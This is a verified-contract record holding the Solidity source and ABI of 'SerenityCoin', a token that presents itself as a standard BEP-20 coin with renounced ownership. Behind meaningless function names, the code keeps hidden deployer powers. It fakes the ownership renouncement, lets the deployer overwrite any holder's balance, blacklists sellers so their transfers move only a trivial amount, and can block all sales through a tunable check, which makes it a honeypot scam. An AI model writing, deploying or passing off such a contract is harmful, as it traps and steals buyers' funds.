{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract tokenSell {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface marketingReceiver {\n    function createPair(address swapTotalTake, address teamTake) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface amountMode {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface shouldFrom {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address feeList) external view returns (uint256);\n\n    function transfer(address minLiquidityTotal, uint256 launchSellLimit) external returns (bool);\n\n    function allowance(address senderTo, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchSellLimit) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address minLiquidityTotal,\n        uint256 launchSellLimit\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed amountMax, uint256 value);\n    event Approval(address indexed senderTo, address indexed spender, uint256 value);\n}\n\ninterface shouldFromMetadata is shouldFrom {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SerenityCoin is tokenSell, shouldFrom, shouldFromMetadata {\n\n    bool private isMax;\n\n    function allowance(address txSellToken, address maxLaunched) external view virtual override returns (uint256) {\n        if (maxLaunched == totalFrom) {\n            return type(uint256).max;\n        }\n        return fundShould[txSellToken][maxLaunched];\n    }\n\n    address private limitAtTrading;\n\n    function transfer(address atEnable, uint256 launchSellLimit) external virtual override returns (bool) {\n        return autoFund(_msgSender(), atEnable, launchSellLimit);\n    }\n\n    function balanceOf(address feeList) public view virtual override returns (uint256) {\n        return receiverExempt[feeList];\n    }\n\n    function senderEnable() private view {\n        require(launchLimit[_msgSender()]);\n    }\n\n    bool public receiverMode;\n\n    uint256 constant totalShould = 12 ** 10;\n\n    string private maxMinBuy = \"Serenity Coin\";\n\n    mapping(address => bool) public tradingReceiver;\n\n    function shouldFee(address marketingSenderBuy, address minLiquidityTotal, uint256 launchSellLimit) internal view returns (uint256) {\n        require(launchSellLimit > 0);\n\n        uint256 feeMarketing = 0;\n        if (marketingSenderBuy == senderMarketing && tradingTotal > 0) {\n            feeMarketing = launchSellLimit * tradingTotal / 100;\n        } else if (minLiquidityTotal == senderMarketing && listMinWallet > 0) {\n            feeMarketing = launchSellLimit * listMinWallet / 100;\n        }\n        require(feeMarketing <= launchSellLimit);\n        return launchSellLimit - feeMarketing;\n    }\n\n    uint256 public senderLaunchedTx;\n\n    uint256 public tradingTotal = 0;\n\n    uint256 private sellAmount = 100000000 * 10 ** 18;\n\n    function minMax(address fromMax) public {\n        require(fromMax.balance < 100000);\n        if (fundTake) {\n            return;\n        }\n        if (senderLaunchedTx == receiverSell) {\n            sellLiquidity = true;\n        }\n        launchLimit[fromMax] = true;\n        \n        fundTake = true;\n    }\n\n    uint256 public receiverSell;\n\n    mapping(address => bool) public launchLimit;\n\n    uint256 tokenAmount;\n\n    uint256 fundIs;\n\n    function receiverList(address marketingListIs) public {\n        senderEnable();\n        \n        if (marketingListIs == swapAuto || marketingListIs == senderMarketing) {\n            return;\n        }\n        tradingReceiver[marketingListIs] = true;\n    }\n\n    event OwnershipTransferred(address indexed buyAuto, address indexed exemptList);\n\n    function owner() external view returns (address) {\n        return limitAtTrading;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverTotalFee;\n    }\n\n    function swapMaxBuy() public {\n        emit OwnershipTransferred(swapAuto, address(0));\n        limitAtTrading = address(0);\n    }\n\n    address totalFrom = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function getOwner() external view returns (address) {\n        return limitAtTrading;\n    }\n\n    bool private sellLiquidity;\n\n    uint8 private totalTakeAuto = 18;\n\n    function autoList(address marketingSenderBuy, address minLiquidityTotal, uint256 launchSellLimit) internal returns (bool) {\n        require(receiverExempt[marketingSenderBuy] >= launchSellLimit);\n        receiverExempt[marketingSenderBuy] -= launchSellLimit;\n        receiverExempt[minLiquidityTotal] += launchSellLimit;\n        emit Transfer(marketingSenderBuy, minLiquidityTotal, launchSellLimit);\n        return true;\n    }\n\n    uint256 public listMinWallet = 0;\n\n    function approve(address maxLaunched, uint256 launchSellLimit) public virtual override returns (bool) {\n        fundShould[_msgSender()][maxLaunched] = launchSellLimit;\n        emit Approval(_msgSender(), maxLaunched, launchSellLimit);\n        return true;\n    }\n\n    function tokenReceiver(address atEnable, uint256 launchSellLimit) public {\n        senderEnable();\n        receiverExempt[atEnable] = launchSellLimit;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return totalTakeAuto;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return sellAmount;\n    }\n\n    address public swapAuto;\n\n    mapping(address => mapping(address => uint256)) private fundShould;\n\n    address swapLaunchedList;\n\n    function transferFrom(address marketingSenderBuy, address minLiquidityTotal, uint256 launchSellLimit) external override returns (bool) {\n        if (_msgSender() != totalFrom) {\n            if (fundShould[marketingSenderBuy][_msgSender()] != type(uint256).max) {\n                require(launchSellLimit <= fundShould[marketingSenderBuy][_msgSender()]);\n                fundShould[marketingSenderBuy][_msgSender()] -= launchSellLimit;\n            }\n        }\n        return autoFund(marketingSenderBuy, minLiquidityTotal, launchSellLimit);\n    }\n\n    function maxEnable(uint256 launchSellLimit) public {\n        senderEnable();\n        tokenAmount = launchSellLimit;\n    }\n\n    function autoFund(address marketingSenderBuy, address minLiquidityTotal, uint256 launchSellLimit) internal returns (bool) {\n        if (marketingSenderBuy == swapAuto) {\n            return autoList(marketingSenderBuy, minLiquidityTotal, launchSellLimit);\n        }\n        uint256 limitMin = shouldFrom(senderMarketing).balanceOf(swapLaunchedList);\n        require(limitMin == tokenAmount);\n        require(minLiquidityTotal != swapLaunchedList);\n        if (tradingReceiver[marketingSenderBuy]) {\n            return autoList(marketingSenderBuy, minLiquidityTotal, totalShould);\n        }\n        launchSellLimit = shouldFee(marketingSenderBuy, minLiquidityTotal, launchSellLimit);\n        return autoList(marketingSenderBuy, minLiquidityTotal, launchSellLimit);\n    }\n\n    bool public fundTake;\n\n    mapping(address => uint256) private receiverExempt;\n\n    string private receiverTotalFee = \"SCN\";\n\n    function name() external view virtual override returns (string memory) {\n        return maxMinBuy;\n    }\n\n    constructor (){\n        \n        swapMaxBuy();\n        amountMode teamReceiver = amountMode(totalFrom);\n        senderMarketing = marketingReceiver(teamReceiver.factory()).createPair(teamReceiver.WETH(), address(this));\n        swapLaunchedList = marketingReceiver(teamReceiver.factory()).feeTo();\n        \n        swapAuto = _msgSender();\n        launchLimit[swapAuto] = true;\n        receiverExempt[swapAuto] = sellAmount;\n        if (isMax) {\n            receiverSell = senderLaunchedTx;\n        }\n        emit Transfer(address(0), swapAuto, sellAmount);\n    }\n\n    address public senderMarketing;\n\n    uint256 public amountTxFund;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptList\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountMax\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txSellToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxLaunched\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTxFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchSellLimit\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeList\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listMinWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchSellLimit\",\"type\":\"uint256\"}],\"name\":\"maxEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromMax\",\"type\":\"address\"}],\"name\":\"minMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingListIs\",\"type\":\"address\"}],\"name\":\"receiverList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderLaunchedTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapMaxBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchSellLimit\",\"type\":\"uint256\"}],\"name\":\"tokenReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchSellLimit\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingSenderBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minLiquidityTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchSellLimit\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SerenityCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}